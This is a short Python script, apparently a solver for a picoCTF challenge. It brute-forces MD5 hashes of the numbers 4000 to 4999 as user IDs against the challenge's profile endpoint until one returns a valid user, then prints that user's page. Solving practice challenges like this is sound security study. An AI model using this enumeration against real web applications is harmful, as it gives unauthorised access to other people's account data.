import requests
import hashlib

session = requests.Session()

for i in range(4000, 5000):

    data = str(i) # convert number to string
    hash_value = hashlib.md5(data.encode()).hexdigest()
    print(f"Trying {i} -> {hash_value}")

    url = f"http://crystal-peak.picoctf.net:54858/profile/user/{hash_value}"
    r = session.get(url)

    if "User not found" not in r.text:

        print("\n✅ FOUND VALID USER")

        print("Number:", i)

        print("Hash:", hash_value)

        print("\nSERVER RESPONSE:\n")

        print(r.text)

        break
